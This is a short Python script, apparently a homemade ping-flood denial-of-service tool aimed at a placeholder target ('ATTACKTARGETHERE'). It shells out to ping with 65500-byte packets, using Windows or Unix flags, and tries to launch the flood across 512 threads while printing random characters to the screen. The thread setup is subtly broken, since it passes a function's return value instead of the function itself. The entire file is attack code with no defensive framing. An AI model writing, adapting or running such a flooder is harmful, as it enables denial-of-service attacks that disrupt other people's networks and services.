import os
import threading
import random
import time
def Wping():
    os.system(f"ping ATTACKTARGETHERE -t -l 65500")
def Lping():
    os.system(f"ping ATTACKTARGETHERE -s 65500")
option = Lping()
for s in range(6550):
    print(random.choice('@#0\t'), end="")
if os.name == 'nt':
    option = Wping()
for i in range(512):
    thead = threading.Thread(target=option, name=f'TH{i}')
    thead.start()
